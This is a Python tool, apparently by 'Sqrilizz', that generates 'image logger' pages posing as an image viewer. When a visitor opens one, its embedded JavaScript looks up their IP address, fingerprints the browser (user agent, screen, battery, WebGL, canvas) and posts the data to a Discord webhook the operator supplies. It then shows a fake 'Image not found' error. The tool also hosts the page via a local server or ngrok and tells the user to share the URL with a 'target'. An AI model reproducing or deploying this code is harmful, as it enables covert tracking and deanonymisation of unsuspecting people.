"""
Enhanced ImageLogger with Multiple Hosting Options
"""
import os
import time
import random
import string
import requests
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
from colorama import Fore, init

init(autoreset=True)

class LocalHTTPServer:
    """Local HTTP server for hosting image loggers"""
    
    def __init__(self, port=8080):
        self.port = port
        self.server = None
        self.server_thread = None
        self.base_url = f"http://localhost:{port}"
        # Store the absolute path to generated_images directory
        self.generated_images_path = os.path.abspath("generated_images")
    
    def start_server(self):
        """Start the local HTTP server"""
        try:
            # Create server with custom handler
            self.server = HTTPServer(('0.0.0.0', self.port), self.CustomHTTPRequestHandler)
            
            # Start server in a separate thread
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()
            
            # Wait for server to start
            time.sleep(1)
            
            # Test if server is actually running
            try:
                import requests
                response = requests.get(f"http://localhost:{self.port}", timeout=3)
                print(f"{Fore.GREEN}[+] Local server started at {self.base_url}")
                print(f"{Fore.CYAN}[*] Server is listening on all interfaces (0.0.0.0:{self.port})")
                print(f"{Fore.CYAN}[*] Server test successful: {response.status_code}")
                return True
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Server started but test failed: {e}")
                print(f"{Fore.CYAN}[*] Server might still work with ngrok")
                return True
            
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to start local server: {e}")
            return False
    
    class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
        """Custom HTTP request handler that serves files from generated_images directory"""
        
        def __init__(self, *args, **kwargs):
            # Get the generated_images path from the server instance
            self.generated_images_path = os.path.abspath("generated_images")
            print(f"{Fore.CYAN}[HTTP] Server initialized with path: {self.generated_images_path}")
            super().__init__(*args, **kwargs)
        
        def translate_path(self, path):
            """Translate URL path to file system path"""
            # Remove leading slash
            path = path.lstrip('/')
            
            # If path is empty, serve index.html or list directory
            if not path:
                path = "index.html"
            
            # Construct full path using the stored generated_images_path
            full_path = os.path.join(self.generated_images_path, path)
            
            # Debug: print the path translation
            print(f"{Fore.CYAN}[HTTP] Path translation: '{self.path}' -> '{full_path}'")
            
            # Ensure the path is within the generated_images directory for security
            if not os.path.abspath(full_path).startswith(self.generated_images_path):
                print(f"{Fore.RED}[HTTP] Security check failed: {full_path}")
                return os.path.join(self.generated_images_path, "index.html")
            
            return full_path
        
        def do_GET(self):
            """Handle GET requests"""
            try:
                # Handle favicon.ico requests
                if self.path == '/favicon.ico':
                    print(f"{Fore.CYAN}[HTTP] Favicon request, sending 204 No Content")
                    self.send_response(204)
                    self.end_headers()
                    return
                
                # Get the file path
                file_path = self.translate_path(self.path)
                
                # Check if file exists
                if not os.path.exists(file_path):
                    print(f"{Fore.RED}[HTTP] File not found: {file_path}")
                    # Try to list directory contents for debugging
                    if os.path.exists(self.generated_images_path):
                        files = os.listdir(self.generated_images_path)
                        print(f"{Fore.YELLOW}[HTTP] Available files: {files[:5]}...")  # Show first 5 files
                    self.send_error(404, "File not found")
                    return
                
                # Serve the file
                print(f"{Fore.GREEN}[HTTP] Serving: {self.path} -> {file_path}")
                super().do_GET()
                
            except Exception as e:
                error_msg = str(e)
                if "10053" in error_msg or "ConnectionAbortedError" in error_msg:
                    print(f"{Fore.YELLOW}[HTTP] Connection aborted by client: {self.path}")
                    # Don't send error response, connection is already closed
                    return
                else:
                    print(f"{Fore.RED}[HTTP] Error serving {self.path}: {e}")
                    try:
                        self.send_error(500, "Internal server error")
                    except:
                        # Connection might be closed, ignore
                        pass
        
        def log_message(self, format, *args):
            """Override to provide better logging"""
            print(f"{Fore.CYAN}[HTTP] {format % args}")
    
    def stop_server(self):
        """Stop the local HTTP server"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            print(f"{Fore.YELLOW}[!] Local server stopped")

class ImageLoggerEnhanced:
    """Enhanced ImageLogger with multiple hosting options"""
    
    def __init__(self):
        self.webhook_url = None
        self.image_name = None
        self.output_dir = "generated_images"
        self.hosting_option = None
        self.local_server = None
        self.ngrok_tunnel_type = 'http' # Default to HTTP tunnel
        
        # Create output directory
        self.create_output_directory()
    
    def print_banner(self):
        """Print application banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.MAGENTA}")
        print("   █████   █    ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ █    ██  ███▄ ▄███▓")
        print(" ▒██▓  ██▒ ██  ▓██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒ ██  ▓██▒▓██▒▀█▀ ██▒")
        print(" ▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▓██  ▒██░▓██    ▓██░")
        print(" ░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▓▓█  ░██░▒██    ▒██ ")
        print(" ░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ▒▒█████▓ ▒██▒   ░██▒")
        print(" ░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░")
        print("  ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░░   ░ ▒░    ░    ░░▒░ ░ ░ ░  ░      ░")
        print("    ░   ░  ░░░ ░ ░   ░   ▒      ░   ░ ░   ░       ░░░ ░ ░ ░      ░   ")
        print("     ░       ░           ░  ░         ░             ░            ░   ")
        print(f"{Fore.MAGENTA}                                by Sqrilizz\n")
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                    ENHANCED IMAGE LOGGER GENERATOR                          ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝\n")
    
    def get_user_input(self):
        """Get user input for configuration"""
        print(f"{Fore.YELLOW}[*] Enter Discord webhook URL: ", end="")
        self.webhook_url = input().strip()
        
        if not self.webhook_url.startswith("https://discord.com/api/webhooks/"):
            print(f"{Fore.RED}[!] Invalid webhook URL format!")
            return False
        
        print(f"{Fore.YELLOW}[*] Enter image name (default: image): ", end="")
        name_input = input().strip()
        self.image_name = name_input if name_input else "image"
        
        # Choose hosting option
        print(f"\n{Fore.CYAN}[*] Choose hosting option:")
        print(f"{Fore.WHITE}    1. Local HTTP Server (Recommended)")
        print(f"{Fore.WHITE}    2. File System (Save locally)")
        print(f"{Fore.WHITE}    3. Custom URL (Enter your own)")
        print(f"{Fore.WHITE}    4. ngrok Tunnel (Requires ngrok)")
        
        while True:
            try:
                choice = input(f"\n{Fore.YELLOW}[*] Enter choice (1-4): ").strip()
                if choice in ['1', '2', '3', '4']:
                    self.hosting_option = choice
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid choice. Please enter 1-4.")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Operation cancelled")
                return False
        
        return True
    
    def create_output_directory(self):
        """Create output directory if it doesn't exist"""
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
            print(f"{Fore.GREEN}[+] Created output directory: {self.output_dir}")
    
    def generate_random_filename(self):
        """Generate random filename for the image"""
        random_chars = ''.join(random.choices(string.ascii_letters, k=8))
        return f"{self.image_name}_{random_chars}"
    
    def create_image_logger_html(self, filename):
        """Create the image logger HTML file"""
        filepath = os.path.join(self.output_dir, f"{filename}.html")
        
        # HTML template for image logger
        html_content = f'''<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
        }}
        .image-container {{
            text-align: center;
            color: white;
        }}
        .loading {{
            font-size: 18px;
            margin-bottom: 20px;
        }}
        .spinner {{
            border: 4px solid #333;
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .error {{
            color: #ff4444;
            font-size: 16px;
        }}
    </style>
</head>
<body>
    <div class="image-container">
        <div class="loading">
            <div class="spinner"></div>
            Loading image...
        </div>
        <div id="error" class="error" style="display: none;"></div>
    </div>

    <script>
        // Discord webhook URL
        const webhookUrl = "{self.webhook_url}";
        
        // Get user information
        const userInfo = {{
            ip: "{{{{ip}}}}",
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screenResolution: screen.width + "x" + screen.height,
            colorDepth: screen.colorDepth + " bit",
            pixelDepth: screen.pixelDepth + " bit",
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString(),
            referrer: document.referrer || "Direct access",
            url: window.location.href,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            onLine: navigator.onLine,
            javaEnabled: navigator.javaEnabled(),
            hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
            deviceMemory: navigator.deviceMemory || "Unknown",
            maxTouchPoints: navigator.maxTouchPoints || "Unknown",
            connection: navigator.connection ? {{
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            }} : "Unknown",
            battery: null,
            geolocation: null,
            webgl: null,
            canvas: null
        }};
        
        // Send data to Discord webhook
        async function sendToDiscord() {{
            try {{
                const response = await fetch(webhookUrl, {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/json',
                    }},
                    body: JSON.stringify({{
                        embeds: [{{
                            title: "🖼️ Image Logger Triggered",
                            description: "Someone opened the image logger!",
                            color: 0x00ff00,
                            fields: [
                                {{
                                    name: "🌐 IP Address",
                                    value: userInfo.ip,
                                    inline: true
                                }},
                                {{
                                    name: "🖥️ Platform",
                                    value: userInfo.platform,
                                    inline: true
                                }},
                                {{
                                    name: "📱 Screen Resolution",
                                    value: userInfo.screenResolution,
                                    inline: true
                                }},
                                {{
                                    name: "🎨 Color Depth",
                                    value: userInfo.colorDepth,
                                    inline: true
                                }},
                                {{
                                    name: "🌍 Language",
                                    value: userInfo.language,
                                    inline: true
                                }},
                                {{
                                    name: "⏰ Timezone",
                                    value: userInfo.timezone,
                                    inline: true
                                }},
                                {{
                                    name: "🔗 Referrer",
                                    value: userInfo.referrer,
                                    inline: true
                                }},
                                {{
                                    name: "🍪 Cookies Enabled",
                                    value: userInfo.cookiesEnabled ? "Yes" : "No",
                                    inline: true
                                }},
                                {{
                                    name: "🖥️ Hardware Concurrency",
                                    value: userInfo.hardwareConcurrency,
                                    inline: true
                                }},
                                {{
                                    name: "💾 Device Memory",
                                    value: userInfo.deviceMemory + " GB",
                                    inline: true
                                }},
                                {{
                                    name: "📱 Max Touch Points",
                                    value: userInfo.maxTouchPoints,
                                    inline: true
                                }},
                                {{
                                    name: "📅 Timestamp",
                                    value: userInfo.timestamp,
                                    inline: true
                                }},
                                {{
                                    name: "🔍 User Agent",
                                    value: userInfo.userAgent,
                                    inline: false
                                }},
                                {{
                                    name: "🌐 Connection Info",
                                    value: typeof userInfo.connection === 'object' ? 
                                        `Type: ${{userInfo.connection.effectiveType}}, Speed: ${{userInfo.connection.downlink}}Mbps, RTT: ${{userInfo.connection.rtt}}ms` : 
                                        "Unknown",
                                    inline: false
                                    }},
                                {{
                                    name: "🔋 Battery Info",
                                    value: typeof userInfo.battery === 'object' ? 
                                        `Level: ${{userInfo.battery.level}}, Charging: ${{userInfo.battery.charging ? 'Yes' : 'No'}}` : 
                                        userInfo.battery,
                                    inline: true
                                }},
                                {{
                                    name: "🎮 WebGL Info",
                                    value: typeof userInfo.webgl === 'object' ? 
                                        `Vendor: ${{userInfo.webgl.vendor}}, Renderer: ${{userInfo.webgl.renderer}}` : 
                                        userInfo.webgl,
                                    inline: false
                                }}
                            ],
                            footer: {{
                                text: "Image Logger by Sqrilizz"
                            }}
                        }}]
                    }})
                }});
                
                if (response.ok) {{
                    console.log("Data sent successfully");
                }} else {{
                    console.error("Failed to send data");
                }}
            }} catch (error) {{
                console.error("Error sending data:", error);
            }}
        }}
        
        // Get battery information
        async function getBatteryInfo() {{
            if ('getBattery' in navigator) {{
                try {{
                    const battery = await navigator.getBattery();
                    userInfo.battery = {{
                        level: Math.round(battery.level * 100) + "%",
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    }};
                }} catch (error) {{
                    userInfo.battery = "Not available";
                }}
            }} else {{
                userInfo.battery = "Not supported";
            }}
        }}
        
        // Get WebGL information
        function getWebGLInfo() {{
            try {{
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {{
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    userInfo.webgl = {{
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Unknown",
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown"
                    }};
                }} else {{
                    userInfo.webgl = "Not supported";
                }}
            }} catch (error) {{
                userInfo.webgl = "Error getting WebGL info";
            }}
        }}
        
        // Get canvas fingerprint
        function getCanvasFingerprint() {{
            try {{
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px Arial";
                ctx.fillText("Canvas fingerprint", 2, 2);
                userInfo.canvas = canvas.toDataURL();
            }} catch (error) {{
                userInfo.canvas = "Error generating canvas fingerprint";
            }}
        }}
        
        // Get IP address and send data
        async function getIPAndSend() {{
            try {{
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userInfo.ip = data.ip;
                
                // Get additional system information
                await getBatteryInfo();
                getWebGLInfo();
                getCanvasFingerprint();
                
                await sendToDiscord();
            }} catch (error) {{
                userInfo.ip = "Unknown";
                await sendToDiscord();
            }}
        }}
        
        // Execute when page loads
        window.onload = function() {{
            getIPAndSend();
            
            // Show loading for a moment, then redirect or show error
            setTimeout(() => {{
                document.querySelector('.loading').style.display = 'none';
                document.getElementById('error').style.display = 'block';
                document.getElementById('error').textContent = 'Image not found or loading failed.';
            }}, 2000);
        }};
    </script>
</body>
</html>'''
        
        # Write HTML file
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return filepath
    
    def setup_local_server(self):
        """Setup local HTTP server"""
        print(f"{Fore.CYAN}[*] Setting up local HTTP server...")
        
        # Create index.html file for root requests
        index_file = os.path.join(self.output_dir, "index.html")
        index_content = """<!DOCTYPE html>
<html>
<head>
    <title>Image Logger Server</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .container { max-width: 600px; margin: 0 auto; }
        .file-list { background: #f5f5f5; padding: 20px; border-radius: 5px; }
        .file-item { margin: 5px 0; }
        a { color: #0066cc; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🖼️ Image Logger Server</h1>
        <p>Server is running. Available files:</p>
        <div class="file-list">
            <div class="file-item">📄 <a href="/test.html">test.html</a> - Test file</div>
            <div class="file-item">📄 <a href="/piska_dqACCgjx.html">piska_dqACCgjx.html</a> - Image logger</div>
            <div class="file-item">📄 <a href="/piska_AhXAGYxG.html">piska_AhXAGYxG.html</a> - Image logger</div>
            <div class="file-item">📄 <a href="/piska_LcJDMxrM.html">piska_LcJDMxrM.html</a> - Image logger</div>
        </div>
        <p><small>Use specific image URLs to access files.</small></p>
    </div>
</body>
</html>"""
        
        with open(index_file, 'w', encoding='utf-8') as f:
            f.write(index_content)
        print(f"{Fore.GREEN}[+] Created index.html")
        
        self.local_server = LocalHTTPServer()
        if self.local_server.start_server():
            # Test if server is actually working
            try:
                import requests
                response = requests.get("http://localhost:8080", timeout=3)
                print(f"{Fore.GREEN}[+] Server test successful: {response.status_code}")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Server test failed: {e}")
                print(f"{Fore.CYAN}[*] Server might still work with ngrok")
            
            return self.local_server.base_url
        else:
            return None
    
    def setup_ngrok_tunnel(self):
        """Setup ngrok tunnel (if available)"""
        print(f"{Fore.CYAN}[*] Checking for ngrok...")
        
        try:
            import subprocess
            import os
            
            # Try to find ngrok in common locations
            ngrok_paths = [
                "ngrok",
                "ngrok.exe",
                "C:\\ngrok\\ngrok.exe",
                "C:\\Program Files\\ngrok\\ngrok.exe",
                "C:\\Program Files (x86)\\ngrok\\ngrok.exe",
                os.path.expanduser("~/ngrok/ngrok"),
                os.path.expanduser("~/.local/bin/ngrok"),
                "/usr/local/bin/ngrok",
                "/usr/bin/ngrok"
            ]
            
            ngrok_found = False
            ngrok_cmd = None
            
            for path in ngrok_paths:
                try:
                    # Expand environment variables
                    expanded_path = os.path.expandvars(path)
                    if os.path.exists(expanded_path):
                        result = subprocess.run([expanded_path, 'version'], 
                                              capture_output=True, text=True, timeout=5)
                        if result.returncode == 0:
                            ngrok_found = True
                            ngrok_cmd = expanded_path
                            print(f"{Fore.GREEN}[+] ngrok found: {result.stdout.strip()}")
                            break
                except:
                    continue
            
            if not ngrok_found:
                print(f"{Fore.RED}[!] ngrok not found in common locations.")
                print(f"{Fore.YELLOW}[*] Installation options:")
                print(f"{Fore.WHITE}    1. Download from: https://ngrok.com/download")
                print(f"{Fore.WHITE}    2. Extract to C:\\ngrok\\ or add to PATH")
                print(f"{Fore.WHITE}    3. Or install via: winget install ngrok")
                print(f"{Fore.WHITE}    4. Or install via: chocolatey install ngrok")
                
                # Check if ngrok is running as a process
                try:
                    import psutil
                    ngrok_running = False
                    for proc in psutil.process_iter(['pid', 'name']):
                        try:
                            if 'ngrok' in proc.info['name'].lower():
                                ngrok_running = True
                                print(f"{Fore.GREEN}[+] Found ngrok process: {proc.info['name']} (PID: {proc.info['pid']})")
                                break
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            continue
                    
                    if ngrok_running:
                        print(f"{Fore.CYAN}[*] ngrok is running! Trying to get URL...")
                        # Try to get URL from running ngrok
                        try:
                            response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                            if response.status_code == 200:
                                tunnels = response.json()['tunnels']
                                if tunnels:
                                    public_url = tunnels[0]['public_url']
                                    print(f"{Fore.GREEN}[+] Found running ngrok tunnel: {public_url}")
                                    return public_url
                        except:
                            pass
                        
                        print(f"{Fore.YELLOW}[!] Could not get URL from running ngrok")
                        print(f"{Fore.CYAN}[*] Please check ngrok dashboard at: http://localhost:4040")
                        print(f"{Fore.CYAN}[*] Or copy the URL from your ngrok terminal")
                        
                        # Ask for manual URL
                        manual_url = input(f"\n{Fore.YELLOW}[*] Enter ngrok URL manually: ").strip()
                        if manual_url:
                            if not manual_url.startswith(('http://', 'https://')):
                                print(f"{Fore.RED}[!] URL must start with http:// or https://")
                                manual_url = input(f"{Fore.YELLOW}[*] Enter ngrok URL manually: ").strip()
                            
                            if manual_url:
                                print(f"{Fore.GREEN}[+] Using ngrok URL: {manual_url}")
                                return manual_url
                except ImportError:
                    pass
                
                return None
            
            # Start ngrok tunnel
            print(f"{Fore.CYAN}[*] Starting ngrok tunnel...")
            print(f"{Fore.CYAN}[*] Running: {ngrok_cmd} http 8080")
            
            ngrok_process = subprocess.Popen(
                [ngrok_cmd, 'http', '8080'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Wait for ngrok to start
            print(f"{Fore.CYAN}[*] Waiting for ngrok to start...")
            time.sleep(5)
            
            # Get ngrok URL
            try:
                response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                if response.status_code == 200:
                    tunnels = response.json()['tunnels']
                    if tunnels:
                        public_url = tunnels[0]['public_url']
                        print(f"{Fore.GREEN}[+] ngrok HTTP tunnel created: {public_url}")
                        return public_url
            except:
                pass
            
            # If API doesn't work, show manual instructions
            print(f"{Fore.YELLOW}[!] Could not get ngrok URL automatically")
            print(f"{Fore.CYAN}[*] Manual setup instructions:")
            print(f"{Fore.WHITE}    1. Open ngrok dashboard: http://localhost:4040")
            print(f"{Fore.WHITE}    2. Look for the HTTP tunnel")
            print(f"{Fore.WHITE}    3. Copy the public URL")
            
            # Ask user for manual URL
            manual_url = input(f"\n{Fore.YELLOW}[*] Enter ngrok URL manually (or press Enter to skip): ").strip()
            if manual_url:
                return manual_url
            
            return None
                
        except Exception as e:
            print(f"{Fore.RED}[!] Error setting up ngrok: {e}")
            return None
    

    
    def get_custom_url(self):
        """Get custom URL from user"""
        print(f"{Fore.CYAN}[*] Custom URL Setup:")
        print(f"{Fore.WHITE}    - You need to upload the generated file to your hosting")
        print(f"{Fore.WHITE}    - Examples: https://yourdomain.com/ or https://example.com/files/")
        print(f"{Fore.WHITE}    - The file will be appended to your URL")
        
        while True:
            print(f"\n{Fore.YELLOW}[*] Enter your custom URL: ", end="")
            custom_url = input().strip()
            
            if not custom_url:
                print(f"{Fore.RED}[!] URL cannot be empty")
                continue
            
            if not custom_url.startswith(('http://', 'https://')):
                print(f"{Fore.RED}[!] URL must start with http:// or https://")
                print(f"{Fore.YELLOW}[*] Example: https://yourdomain.com/")
                continue
            
            # Test URL accessibility
            try:
                print(f"{Fore.CYAN}[*] Testing URL accessibility...")
                response = requests.head(custom_url, timeout=5)
                if response.status_code < 400:
                    print(f"{Fore.GREEN}[+] URL is accessible")
                else:
                    print(f"{Fore.YELLOW}[!] URL returned status {response.status_code}")
                    print(f"{Fore.YELLOW}[!] Make sure your hosting is working")
            except requests.exceptions.RequestException as e:
                print(f"{Fore.YELLOW}[!] Could not test URL: {e}")
                print(f"{Fore.YELLOW}[!] Make sure your hosting is accessible")
            
            # Confirm URL
            confirm = input(f"\n{Fore.CYAN}[*] Use this URL? (y/n): ").strip().lower()
            if confirm in ['y', 'yes', 'да', 'д']:
                return custom_url.rstrip('/')
            else:
                print(f"{Fore.YELLOW}[*] Please enter a different URL")
    
    def create_shortcut_script(self, filepath, url):
        """Create shortcut script for easy access"""
        shortcut_content = f'''@echo off
title Image Logger - {os.path.basename(filepath)}
color 0a

echo.
echo ========================================
echo         IMAGE LOGGER SHORTCUT
echo ========================================
echo.
echo [INFO] Opening image logger...
echo [INFO] URL: {url}
echo.
echo [INFO] Press any key to open in browser...
pause >nul

start {url}

echo.
echo [INFO] Image logger opened in browser!
echo [INFO] File location: {filepath}
echo.
pause
'''
        
        shortcut_path = os.path.join(self.output_dir, f"open_{os.path.basename(filepath)}.bat")
        with open(shortcut_path, 'w', encoding='utf-8') as f:
            f.write(shortcut_content)
        
        return shortcut_path
    
    def create_upload_instructions(self, filepath, url):
        """Create upload instructions for custom URL hosting"""
        instructions_content = f'''# UPLOAD INSTRUCTIONS FOR CUSTOM URL

## File Information
- File to upload: {os.path.basename(filepath)}
- Full path: {filepath}
- Target URL: {url}

## Upload Steps

### 1. Choose Your Hosting Service
You can use any of these free hosting services:

**GitHub Pages:**
1. Create a GitHub repository
2. Upload the HTML file to the repository
3. Enable GitHub Pages in repository settings
4. Your URL will be: https://username.github.io/repository/filename.html

**Netlify:**
1. Go to https://netlify.com/
2. Drag and drop the HTML file
3. Get a free URL like: https://random-name.netlify.app/filename.html

**Vercel:**
1. Go to https://vercel.com/
2. Upload the HTML file
3. Get a free URL like: https://project-name.vercel.app/filename.html

**Firebase Hosting:**
1. Install Firebase CLI
2. Initialize project: firebase init hosting
3. Upload file to public folder
4. Deploy: firebase deploy

### 2. Upload the File
1. Copy the file: {filepath}
2. Upload it to your chosen hosting service
3. Make sure the file is accessible via web browser

### 3. Test the URL
1. Open the URL in your browser
2. Make sure the page loads correctly
3. Check that the image logger works

### 4. Share the URL
Once uploaded and tested, share the URL with your target.

## Troubleshooting

**File not found (404):**
- Make sure the file is uploaded to the correct location
- Check the file permissions
- Verify the URL path is correct

**Page doesn't load:**
- Check your hosting service status
- Verify the file is accessible
- Try accessing the file directly

**Image logger doesn't work:**
- Make sure JavaScript is enabled
- Check browser console for errors
- Verify the Discord webhook URL is correct

## Support
If you need help with hosting, check the documentation of your chosen hosting service.
'''
        
        instructions_path = os.path.join(self.output_dir, "UPLOAD_INSTRUCTIONS.txt")
        with open(instructions_path, 'w', encoding='utf-8') as f:
            f.write(instructions_content)
        
        return instructions_path
    
    def show_instructions(self, filepath, url):
        """Show usage instructions"""
        print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.GREEN}║                              SETUP COMPLETE!                                ║")
        print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════════════════════════╝\n")
        
        print(f"{Fore.CYAN}[*] Image Logger created successfully!")
        print(f"{Fore.CYAN}[*] File: {filepath}")
        print(f"{Fore.CYAN}[*] URL: {url}")
        print(f"\n{Fore.YELLOW}[*] Instructions:")
        print(f"{Fore.WHITE}    1. Share the URL with your target")
        print(f"{Fore.WHITE}    2. When they open the URL, you'll receive their information")
        print(f"{Fore.WHITE}    3. Check your Discord webhook for notifications")
        
        if self.hosting_option == '1':
            print(f"\n{Fore.YELLOW}[!] Local Server Notes:")
            print(f"{Fore.WHITE}    - Keep this window open to maintain the server")
            print(f"{Fore.WHITE}    - The server will stop when you close this window")
            print(f"{Fore.WHITE}    - Only accessible from your local network")
        
        elif self.hosting_option == '2':
            print(f"\n{Fore.YELLOW}[!] File System Notes:")
            print(f"{Fore.WHITE}    - File saved locally: {filepath}")
            print(f"{Fore.WHITE}    - You need to host this file on your own web server")
        
        elif self.hosting_option == '3':
            print(f"\n{Fore.YELLOW}[!] Custom URL Notes:")
            print(f"{Fore.WHITE}    - Upload the file to your hosting")
            print(f"{Fore.WHITE}    - File to upload: {filepath}")
            print(f"{Fore.WHITE}    - Upload to: {url}")
            print(f"{Fore.WHITE}    - Make sure the file is accessible via web")
        
        elif self.hosting_option == '4':
            print(f"\n{Fore.YELLOW}[!] ngrok Notes:")
            print(f"{Fore.WHITE}    - URL is publicly accessible")
            print(f"{Fore.WHITE}    - Keep ngrok running to maintain the tunnel")
        

    
    def run(self):
        """Main execution method"""
        try:
            self.print_banner()
            
            if not self.get_user_input():
                return
            
            # Generate filename
            filename = self.generate_random_filename()
            
            # Create HTML file
            filepath = self.create_image_logger_html(filename)
            print(f"{Fore.GREEN}[+] Created image logger: {filepath}")
            
            # Setup hosting based on option
            url = None
            
            if self.hosting_option == '1':  # Local server
                url = self.setup_local_server()
                if url:
                    url = f"{url}/{filename}.html"
                else:
                    print(f"{Fore.RED}[!] Failed to start local server")
                    return
            
            elif self.hosting_option == '2':  # File system
                url = f"file:///{filepath.replace(os.sep, '/')}"
                print(f"{Fore.GREEN}[+] File saved locally: {filepath}")
            
            elif self.hosting_option == '3':  # Custom URL
                base_url = self.get_custom_url()
                if base_url:
                    url = f"{base_url}/{filename}.html"
                    print(f"{Fore.GREEN}[+] Custom URL configured: {url}")
                    print(f"{Fore.CYAN}[*] Next steps:")
                    print(f"{Fore.WHITE}    1. Upload file: {filepath}")
                    print(f"{Fore.WHITE}    2. Upload to: {base_url}/")
                    print(f"{Fore.WHITE}    3. Make sure file is accessible at: {url}")
                else:
                    return
            
            elif self.hosting_option == '4':  # ngrok
                ngrok_url = self.setup_ngrok_tunnel()
                if ngrok_url:
                    url = f"{ngrok_url}/{filename}.html"
                else:
                    print(f"{Fore.RED}[!] Failed to setup ngrok tunnel")
                    return
            

            
            # Create shortcut script
            shortcut_path = self.create_shortcut_script(filepath, url)
            print(f"{Fore.GREEN}[+] Created shortcut: {shortcut_path}")
            
            # Create upload instructions for custom URL
            if self.hosting_option == '3':
                upload_instructions_path = self.create_upload_instructions(filepath, url)
                print(f"{Fore.GREEN}[+] Created upload instructions: {upload_instructions_path}")
            
            # Show instructions
            self.show_instructions(filepath, url)
            
            # Keep server running if local
            if self.hosting_option == '1':
                print(f"\n{Fore.CYAN}[*] Local server is running. Press Ctrl+C to stop...")
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    print(f"\n{Fore.YELLOW}[!] Stopping server...")
                    if self.local_server:
                        self.local_server.stop_server()
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Operation cancelled by user")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")

def main():
    """Main entry point"""
    logger = ImageLoggerEnhanced()
    logger.run()

if __name__ == "__main__":
    main() 